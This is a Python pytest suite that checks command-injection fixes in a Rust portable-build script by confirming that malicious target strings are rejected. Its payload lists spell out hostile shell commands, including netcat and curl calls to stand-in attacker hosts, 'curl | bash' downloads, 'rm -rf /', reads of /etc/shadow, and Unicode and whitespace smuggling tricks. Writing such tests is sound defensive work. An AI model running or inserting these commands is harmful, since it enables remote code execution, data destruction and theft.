#!/usr/bin/env python3
"""
Security tests for libs/portable/generate.py command injection fixes.

This test suite verifies VULN-010 and VULN-011 have been fixed.
"""

import pytest
import sys
import os
from pathlib import Path

# Add paths
sys.path.insert(0, str(Path(__file__).parent.parent / "libs" / "portable"))

from generate import validate_target, validate_folder, build_portable, ALLOWED_TARGETS


class TestValidateTarget:
    """Test target validation against command injection."""
    
    def test_valid_targets_accepted(self):
        """Verify all allowed targets are accepted."""
        for target in ALLOWED_TARGETS:
            result = validate_target(target)
            assert result == target
    
    def test_none_target_accepted(self):
        """Verify None target is accepted (default build)."""
        result = validate_target(None)
        assert result is None
    
    def test_empty_string_target_accepted(self):
        """Verify empty string target is treated as None."""
        result = validate_target("")
        assert result is None
    
    def test_injection_semicolon_blocked(self):
        """Verify semicolon injection is blocked."""
        with pytest.raises(ValueError, match="Invalid target"):
            validate_target("x86_64-linux-gnu; rm -rf /")
    
    def test_injection_pipe_blocked(self):
        """Verify pipe injection is blocked."""
        with pytest.raises(ValueError, match="Invalid target"):
            validate_target("x86_64-linux-gnu | nc attacker.com 1234")
    
    def test_injection_ampersand_blocked(self):
        """Verify ampersand injection is blocked."""
        with pytest.raises(ValueError, match="Invalid target"):
            validate_target("x86_64-linux-gnu && wget evil.com/backdoor")
    
    def test_injection_backticks_blocked(self):
        """Verify backtick injection is blocked."""
        with pytest.raises(ValueError, match="Invalid target"):
            validate_target("x86_64-linux-gnu`whoami`")
    
    def test_injection_dollar_blocked(self):
        """Verify dollar command substitution is blocked."""
        with pytest.raises(ValueError, match="Invalid target"):
            validate_target("x86_64-linux-gnu$(curl http://evil.com/payload)")
    
    def test_invalid_target_blocked(self):
        """Verify arbitrary invalid targets are blocked."""
        invalid_targets = [
            "completely-invalid-target",
            "x86_64-evil-os",
            "../../../etc/passwd",
            "C:\\Windows\\System32",
        ]
        
        for invalid in invalid_targets:
            with pytest.raises(ValueError, match="Invalid target"):
                validate_target(invalid)


class TestValidateFolder:
    """Test folder path validation."""
    
    def test_valid_folder_accepted(self, tmp_path):
        """Verify valid existing folder is accepted."""
        test_dir = tmp_path / "testdir"
        test_dir.mkdir()
        
        result = validate_folder(str(test_dir))
        assert result.exists()
        assert result.is_dir()
    
    def test_nonexistent_folder_rejected(self, tmp_path):
        """Verify nonexistent folder is rejected."""
        with pytest.raises(ValueError, match="does not exist"):
            validate_folder(str(tmp_path / "nonexistent"))
    
    def test_file_path_rejected(self, tmp_path):
        """Verify file path (not directory) is rejected."""
        test_file = tmp_path / "test.txt"
        test_file.write_text("test")
        
        with pytest.raises(ValueError, match="not a directory"):
            validate_folder(str(test_file))
    
    def test_path_traversal_resolved(self, tmp_path):
        """Verify path traversal is safely resolved."""
        test_dir = tmp_path / "testdir"
        test_dir.mkdir()
        
        # Path with .. should be resolved safely
        traversal_path = str(test_dir / ".." / "testdir")
        result = validate_folder(traversal_path)
        
        # Should resolve to the actual path
        assert result.resolve() == test_dir.resolve()


class TestBuildPortable:
    """Test build_portable function security."""
    
    def test_malicious_target_blocked(self, tmp_path):
        """Verify malicious targets are blocked."""
        malicious_targets = [
            "; rm -rf /tmp/test",
            "| nc attacker.com 1234",
            "$(curl evil.com/payload | bash)",
            "`id`",
            "&& echo pwned",
        ]
        
        for malicious in malicious_targets:
            with pytest.raises(ValueError, match="Invalid target"):
                build_portable(str(tmp_path), malicious)
    
    def test_invalid_folder_blocked(self):
        """Verify invalid folders are blocked."""
        with pytest.raises(ValueError):
            build_portable("/nonexistent/path", None)
    
    def test_valid_target_format(self, tmp_path):
        """Verify valid target is properly formatted."""
        # This would fail if cargo isn't installed, but validates our logic
        test_dir = tmp_path / "testproject"
        test_dir.mkdir()
        
        # Create minimal Cargo.toml
        (test_dir / "Cargo.toml").write_text("""
[package]
name = "test"
version = "0.1.0"
edition = "2021"

[dependencies]
""")
        
        # Create src directory
        src_dir = test_dir / "src"
        src_dir.mkdir()
        (src_dir / "main.rs").write_text('fn main() { println!("test"); }')
        
        # Test with valid target (will fail on cargo, but validates input)
        try:
            build_portable(str(test_dir), "x86_64-unknown-linux-gnu")
        except SystemExit:
            # Expected to fail if cargo not installed or target not installed
            pass


class TestMaliciousPayloads:
    """Test with actual attack payloads."""
    
    MALICIOUS_PAYLOADS = [
        # Command chaining
        "x86_64-linux; rm -rf /",
        "target && echo pwned",
        "target || curl evil.com",
        
        # Command substitution
        "$(curl http://evil.com/payload.sh | bash)",
        "`wget evil.com/backdoor`",
        
        # Pipes and redirects
        "target | nc attacker.com 1234",
        "target > /etc/passwd",
        "target < /etc/shadow",
        
        # Background execution
        "target & sleep 3600",
        
        # Path traversal
        "../../../etc/evil-target",
        "C:\\Windows\\System32\\cmd.exe",
        
        # Encoded attacks
        "target%20;%20id",
        "target\n\nrm -rf /",
    ]
    
    def test_all_malicious_payloads_blocked(self):
        """Verify comprehensive list of attack payloads is blocked."""
        for payload in self.MALICIOUS_PAYLOADS:
            with pytest.raises(ValueError, match="Invalid target"):
                validate_target(payload)


class TestSecurityRegression:
    """Regression tests for generate.py."""
    
    def test_no_os_system_in_generate_py(self):
        """Verify os.system() is not used except in comments."""
        generate_py = Path(__file__).parent.parent / "libs" / "portable" / "generate.py"
        content = generate_py.read_text()
        
        import re
        os_system_calls = re.findall(r'os\.system\([^)]+\)', content)
        
        # Should have no os.system() calls (except in comments/docs)
        for call in os_system_calls:
            assert '#' in call or 'SECURITY' in call or 'replaces' in call, \
                f"Found unsafe os.system() call: {call}"
    
    def test_subprocess_has_shell_false(self):
        """Verify subprocess.run uses shell=False."""
        generate_py = Path(__file__).parent.parent / "libs" / "portable" / "generate.py"
        content = generate_py.read_text()
        
        import re
        subprocess_calls = re.findall(
            r'subprocess\.run\([^)]+\)', 
            content, 
            re.MULTILINE | re.DOTALL
        )
        
        for call in subprocess_calls:
            assert 'shell=False' in call, \
                f"subprocess.run() must have shell=False: {call[:100]}"
    
    def test_allowed_targets_comprehensive(self):
        """Verify ALLOWED_TARGETS list is comprehensive."""
        # Should have major platforms
        assert 'x86_64-unknown-linux-gnu' in ALLOWED_TARGETS
        assert 'x86_64-pc-windows-msvc' in ALLOWED_TARGETS
        assert 'x86_64-apple-darwin' in ALLOWED_TARGETS
        assert 'aarch64-apple-darwin' in ALLOWED_TARGETS
        
        # Should have mobile platforms
        assert 'aarch64-linux-android' in ALLOWED_TARGETS
        assert 'aarch64-apple-ios' in ALLOWED_TARGETS


class TestInputValidation:
    """Test input validation edge cases."""
    
    def test_unicode_injection_blocked(self):
        """Verify Unicode-based injection attempts are blocked."""
        unicode_attacks = [
            "target\u0000; rm -rf /",  # Null byte
            "target\u202E; evil",        # Right-to-left override
            "target\u2028; evil",        # Line separator
        ]
        
        for attack in unicode_attacks:
            with pytest.raises(ValueError):
                validate_target(attack)
    
    def test_whitespace_injection_blocked(self):
        """Verify whitespace-based injection is blocked."""
        whitespace_attacks = [
            "target\t; evil",
            "target\n; evil",
            "target\r; evil",
            "target ; evil",
        ]
        
        for attack in whitespace_attacks:
            with pytest.raises(ValueError):
                validate_target(attack)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
